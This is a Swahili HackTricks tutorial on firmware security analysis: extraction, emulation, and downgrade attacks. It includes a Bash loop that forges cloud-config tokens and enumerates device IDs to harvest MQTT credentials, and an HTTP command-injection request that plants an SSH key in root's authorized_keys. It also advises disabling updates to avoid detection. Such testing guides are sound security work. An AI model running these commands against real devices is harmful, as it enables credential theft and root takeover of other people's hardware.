# Uchambuzi wa Firmware

{{#include ../../banners/hacktricks-training.md}}

## **Utangulizi**

### Rasilimali zinazohusiana


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware ni software muhimu inayowezesha vifaa kufanya kazi ipasavyo kwa kusimamia na kuwezesha mawasiliano kati ya sehemu za hardware na software ambazo watumiaji wanazitumia. Inahifadhiwa kwenye memory ya kudumu, ikihakikisha kifaa kinaweza kupata maagizo muhimu tangu kinapowashwa, na kupelekea uzinduzi wa mfumo wa uendeshaji. Kuangalia na pengine kubadilisha firmware ni hatua muhimu katika kubaini udhaifu wa usalama.

## **Kukusanya Taarifa**

**Kukusanya taarifa** ni hatua ya mwanzo muhimu katika kuelewa muundo wa kifaa na teknolojia zinazotumika. Mchakato huu unahusisha kukusanya data kuhusu:

- CPU architecture na operating system inayofanya kazi kwenye kifaa
- Bootloader specifics
- Mpangilio wa hardware na datasheets
- Metrics za codebase na maeneo ya source
- Maktaba za nje na aina za leseni
- Historia za updates na vyeti vya udhibiti
- Mchoro wa usanifu na mtiririko
- Tathmini za usalama na udhaifu uliobainishwa

Kwa madhumuni haya, zana za open-source intelligence (OSINT) ni za thamani, kama vile uchambuzi wa vipengele vya open-source kupitia ukaguzi wa mikono na wa kiotomatiki. Zana kama [Coverity Scan](https://scan.coverity.com) na [Semmle’s LGTM](https://lgtm.com/#explore) hutoa free static analysis ambazo zinaweza kutumika kugundua matatizo yanayowezekana.

## **Kupata Firmware**

Kupata firmware kunaweza kufanywa kwa njia mbalimbali, kila moja ikiwa na ngazi yake ya ugumu:

- **Moja kwa moja** kutoka kwa chanzo (developers, manufacturers)
- **Kujenga** kutoka kwenye maelekezo yaliyotolewa
- **Kupakua** kutoka kwenye tovuti za support rasmi
- Kutumia **Google dork** kwa kutafuta faili za firmware zilizochapishwa
- Kufikia **cloud storage** moja kwa moja, kwa zana kama [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Kukamata **updates** kupitia mbinu za man-in-the-middle
- **Kuchoma** kutoka kwenye kifaa kupitia muunganisho kama **UART**, **JTAG**, au **PICit**
- **Kuswagi** kwa ajili ya requests za update ndani ya mawasiliano ya kifaa
- Kutambua na kutumia **hardcoded update endpoints**
- **Kudump** kutoka kwenye bootloader au mtandao
- **Kutoa na kusoma** chip ya storage, pale kila kitu kingine kinaposhindikana, kwa kutumia zana sahihi za hardware

## Kuchambua firmware

Sasa ikiwa una firmware, unahitaji kutoa taarifa kuhusu ile ili kujua jinsi ya kuitendea. Zana mbalimbali utakazoweza kutumia kwa ajili ya hilo:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Iwapo hautapata mengi kwa zana hizo, angalia **entropia** ya image kwa `binwalk -E <bin>`; ikiwa entropia ni ya chini, basi siyo uwezekano mkubwa kwamba imeencrypted. Ikiwa entropia ni ya juu, inawezekana imeencrypted (au imecompressed kwa namna fulani).

Zaidi ya hayo, unaweza kutumia zana hizi kutoa **faili zilizomo ndani ya firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Au [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) kwa kuchunguza faili.

### Kupata Filesystem

Kwa kutumia zana zilizotajwa hapo juu kama `binwalk -ev <bin>` unapaswa kuwa umeweza **kutoa filesystem**.\
Binwalk kawaida huikutoa ndani ya **folda iliyopewa jina kulingana na aina ya filesystem**, ambayo kwa kawaida ni moja ya zifuatazo: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Utoaji wa Filesystem kwa Mkono

Wakati mwingine, binwalk haitakuwa na **magic byte ya filesystem katika signatures zake**. Katika kesi hizi, tumia binwalk ili **kutafuta offset ya filesystem na carve the compressed filesystem** kutoka kwa binary na **kutoa filesystem kwa mkono** kulingana na aina yake kwa kutumia hatua zilizo hapa chini.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Endesha **dd command** ifuatayo ili kuchonga filesystem ya Squashfs.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Kwa njia nyingine, amri ifuatayo pia inaweza kutumika.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Kwa squashfs (ilitumika katika mfano hapo juu)

`$ unsquashfs dir.squashfs`

Faili zitakuwa katika "`squashfs-root`" saraka baadaye.

- Kwa archive za CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Kwa jffs2 filesystems

`$ jefferson rootfsfile.jffs2`

- Kwa ubifs filesystems zenye NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Kuchambua Firmware

Mara firmware inapopatikana, ni muhimu kuichambua ili kuelewa muundo wake na udhaifu unaoweza kuwepo. Mchakato huu unahusisha kutumia zana mbalimbali kuchambua na kutoa data muhimu kutoka kwenye picha ya firmware.

### Zana za Uchambuzi wa Awali

Seti ya amri zimetolewa kwa ukaguzi wa awali wa faili ya binary (inayorejelewa kama `<bin>`). Amri hizi husaidia kutambua aina za faili, kutoa strings, kuchambua data za binary, na kuelewa maelezo ya partition na filesystem:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Ili kutathmini hali ya encryption ya image, **entropy** inakaguliwa kwa kutumia `binwalk -E <bin>`. Entropy ya chini inaonyesha ukosefu wa encryption, wakati entropy ya juu inaashiria uwezekano wa encryption au compression.

Kwa kuchukua **embedded files**, zana na rasilimali kama maandiko ya **file-data-carving-recovery-tools** na **binvis.io** kwa ukaguzi wa faili zinapendekezwa.

### Kutoa Filesystem

Kwa kutumia `binwalk -ev <bin>`, kawaida unaweza kutoa filesystem, mara nyingi ndani ya directory yenye jina la aina ya filesystem (mfano, squashfs, ubifs). Hata hivyo, wakati **binwalk** inashindwa kutambua aina ya filesystem kwa kukosa magic bytes, kunahitajika kutoa filesystem kwa mkono. Hii inajumuisha kutumia `binwalk` kutambua offset ya filesystem, kisha kutumia `dd` kukata/kutoa filesystem:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Baadaye, kulingana na aina ya filesystem (e.g., squashfs, cpio, jffs2, ubifs), amri tofauti zinaweza kutumika kutoa yaliyomo kwa mkono.

### Uchambuzi wa mfumo wa faili

Baada ya mfumo wa faili kuondolewa, uchunguzi wa dosari za usalama unaanza. Umakini unaelekezwa kwa daemoni za mtandao zisizo salama, nywila zilizowekwa kwa kudumu, API endpoints, huduma za seva za masasisho, code isiyochapishwa, scripts za kuanzishwa, na binaries zilizochapishwa kwa uchambuzi nje ya mtandao.

**Maeneo muhimu** na **vitu** vya kuchunguza ni pamoja na:

- **etc/shadow** na **etc/passwd** kwa nywila za watumiaji
- Vyeti na funguo za SSL katika **etc/ssl**
- Faili za usanidi na script kwa ajili ya udhaifu unaoweza kuwepo
- Embedded binaries kwa uchambuzi zaidi
- Seva za wavuti za kawaida za vifaa vya IoT na binaries

Zana kadhaa husaidia kufichua taarifa nyeti na udhaifu ndani ya mfumo wa faili:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) na [**Firmwalker**](https://github.com/craigz28/firmwalker) kwa utafutaji wa taarifa nyeti
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) kwa uchambuzi kamili wa firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), na [**EMBA**](https://github.com/e-m-b-a/emba) kwa uchambuzi wa static na dynamic

### Ukaguzi wa Usalama kwenye binaries zilizochapishwa

Pamoja na source code na binaries zilizochapishwa zilizopatikana kwenye mfumo wa faili, zinapaswa kuchunguzwa kwa udhaifu. Zana kama **checksec.sh** kwa binaries za Unix na **PESecurity** kwa binaries za Windows husaidia kubaini binaries zisizo na ulinzi ambazo zinaweza kutumiwa.

## Kuvuna cloud config na nywila za MQTT kupitia derived URL tokens

Hubs nyingi za IoT hupakua usanidi wa kifaa kwa kila kifaa kutoka kwenye endpoint ya cloud inayofanana na:

- `https://<api-host>/pf/<deviceId>/<token>`

Wakati wa uchambuzi wa firmware unaweza kugundua kwamba `<token>` inatokana mahali hapo kutoka kwa device ID kwa kutumia siri iliyowekwa kwa kudumu, kwa mfano:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Muundo huu unamruhusu mtu yeyote anayejua deviceId na STATIC_KEY kujenga tena URL na kuburuta cloud config, mara nyingi ikifichua nywila za MQTT kwa maandishi wazi na prefiksi za mada.

Mtiririko wa vitendo:

1) Chota deviceId kutoka kwa logi za boot za UART

- Unganisha adapter ya 3.3V UART (TX/RX/GND) na rekodi logi:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Tafuta mistari zinazochapisha cloud config URL pattern na broker address, kwa mfano:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Pata STATIC_KEY na algorithm ya token kutoka firmware

- Pakia binaries kwenye Ghidra/radare2 na tafuta path ya config ("/pf/") au matumizi ya MD5.
- Thibitisha algoritimu (kwa mfano, MD5(deviceId||STATIC_KEY)).
- Pata token kwa kutumia Bash na badilisha digest kuwa herufi kubwa:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Kukusanya cloud config na MQTT credentials

- Tengeneza URL na pakua JSON kwa curl; changanua kwa jq ili kutoa secrets:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Tumia vibaya plaintext MQTT na topic ACLs dhaifu (ikiwa zipo)

- Tumia recovered credentials kujiandikisha (subscribe) kwa maintenance topics na kutafuta matukio nyeti:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Orodhesha device IDs zinazotabirika (kwa wingi, kwa idhini)

- Mifumo mingi huingiza vendor OUI/product/type bytes zikiambatana na nyongeza ya mfululizo.
- Unaweza kupitia candidate IDs, kutengeneza tokens na kupata configs kwa njia ya programu:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Vidokezo
- Daima upate idhini wazi kabla ya kujaribu mass enumeration.
- Pendelea emulation au static analysis ili kupata secrets bila kubadilisha target hardware pale inapowezekana.

Mchakato wa emulating firmware unaruhusu **dynamic analysis** ya uendeshaji wa kifaa au ya programu moja. Mbinu hii inaweza kukutana na changamoto zinazotokana na utegemezi wa hardware au architecture, lakini kuhamisha root filesystem au binaries maalum hadi kifaa chenye architecture na endianness vinavyofanana, kama Raspberry Pi, au kwa virtual machine iliyotengenezwa mapema, kunaweza kurahisisha majaribio zaidi.

### Kuiga binaries binafsi

Kwa kuchunguza programu moja, ni muhimu kubaini endianness ya programu na usanifu wa CPU.

#### Mfano kwa Usanifu wa MIPS

Ili kuiga binary ya usanifu wa MIPS, unaweza kutumia amri:
```bash
file ./squashfs-root/bin/busybox
```
Na kusakinisha zana muhimu za uigaji:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Kwa MIPS (big-endian), `qemu-mips` hutumika, na kwa faili za little-endian, chaguo litakuwa `qemu-mipsel`.

#### ARM Architecture Emulation

Kwa binaries za ARM, mchakato ni sawa, ambapo emulator `qemu-arm` hutumika kwa emulation.

### Emulation ya Mfumo Kamili

Zana kama [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), na nyingine, zinawezesha emulation kamili ya firmware, zinautomatisha mchakato na kusaidia katika uchambuzi wa runtime.

## Uchambuzi wa Runtime kwa Vitendo

Katika hatua hii, mazingira ya kifaa halisi au yaliyogisiwa yanatumika kwa uchambuzi. Ni muhimu kudumisha ufikiaji wa shell kwa OS na filesystem. Emulation inaweza isifanyike kwa usahihi kwa mwingiliano wa vifaa, hivyo mara kwa mara inahitajika kuanzisha tena emulation. Uchambuzi unapaswa kurudia mfumo wa faili, kuchunguza webpages na huduma za mtandao zilizo wazi, na kuchunguza udhaifu wa bootloader. Vipimo vya uadilifu vya firmware ni muhimu ili kutambua uwezekano wa backdoor.

## Mbinu za Uchambuzi wa Runtime

Uchambuzi wa runtime unahusisha kuingiliana na mchakato au binary katika mazingira yake ya uendeshaji, ukitumia zana kama gdb-multiarch, Frida, na Ghidra kuweka breakpoints na kubaini udhaifu kupitia fuzzing na mbinu nyingine.

## Binary Exploitation and Proof-of-Concept

Kuendeleza PoC kwa udhaifu uliotambuliwa kunahitaji uelewa wa kina wa architecture lengwa na uandishi wa programu kwa lugha za kiwango cha chini. Ulinzi wa runtime kwa binaries katika mifumo iliyobandika ni nadra, lakini pale ulipo, mbinu kama Return Oriented Programming (ROP) zinaweza kuhitajika.

## Mifumo ya Uendeshaji Iliyo Tayari kwa Uchambuzi wa Firmware

Mifumo ya uendeshaji kama [AttifyOS](https://github.com/adi0x90/attifyos) na [EmbedOS](https://github.com/scriptingxss/EmbedOS) hutoa mazingira yaliyopangwa awali kwa upimaji wa usalama wa firmware, yakiwa na zana muhimu.

## OS Zilizotayarishwa Kuchambua Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS ni distro iliyolenga kukusaidia kufanya tathmini ya usalama na penetration testing ya vifaa vya Internet of Things (IoT). Inakuokoa wakati mwingi kwa kutoa mazingira yaliyopangwa awali na zana zote muhimu zikiwa zimewekwa.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Operating system ya upimaji wa usalama kwa mifumo iliyobandika (embedded) msingi wa Ubuntu 18.04, yenye zana za upimaji wa usalama wa firmware zikiwa zimewekwa awali.

## Shambulio za Kupunguza Toleo la Firmware na Vifumo Visivyo Salama vya Masaisho

Hata pale muuzaji anapotekeleza ukaguzi wa saini za cryptographic kwa picha za firmware, **kinga dhidi ya version rollback (downgrade) mara nyingi haipo**. Wakati boot- au recovery-loader inathibitisha tu saini kwa kutumia public key iliyowekwa ndani (embedded) lakini haitofananishi *toleo* (au counter monotonic) ya picha inayoflasha, mshambuliaji anaweza kihalali kusakinisha **firmware ya zamani yenye udhaifu ambayo bado ina saini halali** na kwa hivyo kuirudisha tena udhaifu uliorekebishwa.

Mfuatano wa kawaida wa shambulio:

1. **Pata picha iliyo na saini ya zamani**
* Izipate kutoka kwenye portal ya upakuaji ya umma ya muuzaji, CDN au tovuti ya msaada.
* Zitolee kutoka kwa programu za kuambatana kwenye mobile/desktop (kwa mfano ndani ya Android APK chini ya `assets/firmware/`).
* Zipate kutoka kwenye hazina za wahusika wengine kama VirusTotal, maktaba za mtandao, vikao, n.k.
2. **Pakia au tuma picha kwa kifaa** kupitia njia yoyote ya masasisho iliyofunguka:
* Web UI, mobile-app API, USB, TFTP, MQTT, n.k.
* Vifaa vingi vya watumiaji vya IoT vinaweka wazi endpoints za HTTP(S) *unauthenticated* ambazo zinakubali blobs za firmware zilizopakwa Base64, kuzichanganya upande wa server na kuchochea recovery/upgrade.
3. Baada ya downgrade, tumia udhaifu uliorekebishwa katika toleo jipya (kwa mfano chujio la command-injection lililoongezwa baadaye).
4. Kwa hiari, flasha tena picha ya hivi karibuni au zima masasisho ili kuepuka kugunduliwa mara uthabiti unapopatikana.

### Mfano: Command Injection Baada ya Kupunguza Toleo
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
Katika firmware iliyo na udhaifu (iliyopunguzwa), parameter `md5` inachanganywa moja kwa moja ndani ya shell command bila kusafishwa, ikiruhusu injection ya amri zozote (hapa – kuwezesha SSH key-based root access). Toleo za baadaye za firmware zilileta filter ya msingi ya herufi, lakini kukosekana kwa ulinzi dhidi ya kurejeshwa kwa toleo la zamani kunafanya suluhisho hilo kutokuwa na maana.

### Kutoa Firmware Kutoka kwa Apps za Mkononi

Wauzaji wengi wanahifadhi picha kamili za firmware ndani ya aplikasi zao za mwenzake za mkononi ili programu iweze kusasisha kifaa kupitia Bluetooth/Wi-Fi. Paket hizi kwa kawaida zinahifadhiwa bila kusimbwa ndani ya APK/APEX chini ya njia kama `assets/fw/` au `res/raw/`. Zana kama `apktool`, `ghidra`, au hata `unzip` rahisi zinakuwezesha kutoa image zilizotiwa saini bila kugusa vifaa vya kimwili.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Orodha ya Kutathmini Mantiki ya Sasisho

* Je, usafirishaji/uthibitishaji wa *update endpoint* umehifadhiwa vyema (TLS + authentication)?
* Je, kifaa kinalinganisha **nambari za toleo** au **monotonic anti-rollback counter** kabla ya ku-flash?
* Je, image inathibitishwa ndani ya mnyororo wa secure boot (mf. signatures zinakaguliwa na ROM code)?
* Je, userland code inafanya ukaguzi wa ziada wa sanity (mf. allowed partition map, model number)?
* Je, mtiririko wa masasisho ya *partial* au *backup* unatumia tena mantiki ile ile ya uthibitishaji?

> 💡  Ikiwa yoyote ya mambo hapo juu inakosa, jukwaa linaweza kuwa hatarini kwa rollback attacks.

## Firmware zenye udhaifu za kufanya mazoezi

Ili kufanya mazoezi ya kugundua udhaifu katika firmware, tumia miradi ifuatayo ya firmware zenye udhaifu kama msingi.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Marejeo

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)


- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

## Mafunzo na Cheti

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

{{#include ../../banners/hacktricks-training.md}}
